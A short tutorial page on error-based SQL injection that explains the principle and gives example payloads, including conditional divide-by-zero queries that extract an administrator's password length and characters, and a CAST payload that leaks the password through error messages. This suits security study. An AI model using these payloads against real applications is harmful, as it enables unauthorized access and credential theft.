---
title: Error-based SQL Injection
date: 2025-10-20
description: Introduce the error-based SQL injection.
weight: 2
---

## Principles

An application with this vulnerability may respond differently when submitting invalid or error SQL queries. For example, a such application may return `500` status code when submitting the `1/0` expression.

In this case, it is possible to perform SQL injection by trail-and-error with the response status code.

## Payload

Simply, the payload is:

```text
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a
```

By modifying the condition, we can get more information.

```text
' AND (SELECT CASE WHEN (LENGTH(password) = 1) THEN 1/0 ELSE '' END FROM users WHERE username = 'administrator') || '
```

Then we can get the password length.

After that, we can use `SUBSTRING` function to retrieve the password fully.

```text
' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'a') THEN 1/0 ELSE '' END FROM users WHERE username = 'administrator') || '
```

## Verbose SQL Error Messages

Some vulnerable applications will return error messages when submitting invalid SQL queries, which is convenient for attackers.

A type of error message is cast error, which looks like:

```log
ERROR: invalid input syntax for type integer: "Example data"
```

It will occur when we try to cast incompatible data type such as from `VARCHAR` to `INT`. So it is possible to retrieve sensitive data.

The payload may be:

```text
' CAST((SELECT password FROM users WHERE username = 'administrator') AS INT)
```

## Reference

- [PortSwigger](https://portswigger.net/)
